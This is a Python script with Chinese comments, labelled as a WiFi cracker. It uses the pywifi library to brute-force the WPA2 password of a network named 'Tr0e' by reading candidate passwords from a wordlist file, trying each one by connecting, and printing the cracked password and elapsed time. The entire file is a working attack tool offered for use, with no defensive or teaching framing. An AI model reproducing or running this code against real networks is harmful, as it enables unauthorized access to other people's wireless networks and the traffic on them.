import pywifi
from pywifi import const
import time
import datetime

# 测试连接，返回链接结果
def wifiConnect(pwd):
    # 抓取网卡接口
    wifi = pywifi.PyWiFi()
    print("1")
    # 获取第一个无线网卡
    try:
        ifaces = wifi.interfaces()[0]
        # 断开所有连接
        ifaces.disconnect()
        print("3")
        time.sleep(1)
        print("4")
        wifistatus = ifaces.status()
        print("5")
        if wifistatus == const.IFACE_DISCONNECTED:
            print("6")
            # 创建WiFi连接文件
            profile = pywifi.Profile()
            print("7")
            # 要连接WiFi的名称
            profile.ssid = "Tr0e"
            print("8")
            # 网卡的开放状态
            profile.auth = const.AUTH_ALG_OPEN
            print("9")
            # wifi加密算法,一般wifi加密算法为wps
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            print("10")
            # 加密单元
            profile.cipher = const.CIPHER_TYPE_CCMP
            print("11")
            # 调用密码
            profile.key = pwd
            print("12")
            # 删除所有连接过的wifi文件
            ifaces.remove_all_network_profiles()
            print("13")
            # 设定新的连接文件
            tep_profile = ifaces.add_network_profile(profile)
            print("14")
            ifaces.connect(tep_profile)
            print("15")
            # wifi连接时间
            time.sleep(2)
            print("16")
            if ifaces.status() == const.IFACE_CONNECTED:
                print("17")
                return True
            else:
                print("18")
                return False
        else:
            print("已有wifi连接")        
    except Exception as e:
        print(e)
    print("2")


# 读取密码本
def readPassword():
    success = False
    print("****************** WIFI破解 ******************")
    # 密码本路径
    path = "pwd.txt"
    # 打开文件
    file = open(path, "r")
    start = datetime.datetime.now()
    while True:
        try:
            pwd = file.readline()
            # 去除密码的末尾换行符
            pwd = pwd.strip('\n')
            print("尝试密码：", pwd)
            if (not pwd):
                print("尝试密码为空")
                break
            bool = wifiConnect(pwd)
            if bool:
                print("[*] 密码已破解：", pwd)
                print("[*] WiFi已自动连接！！！")
                success = True
                break
            else:
                # 跳出当前循环，进行下一次循环
                print("正在破解 SSID 为 %s 的 WIFI密码，当前校验的密码为：%s"%("Tr0e",pwd))
        except:
            print("报错了")
            break
    end = datetime.datetime.now()
    if(success):
        print("[*] 本次破解WIFI密码一共用了多长时间：{}".format(end - start))
    else:
        print("[*] 很遗憾未能帮你破解出当前指定WIFI的密码，请更换密码字典后重新尝试！")
    exit(0)


if __name__=="__main__":
    readPassword()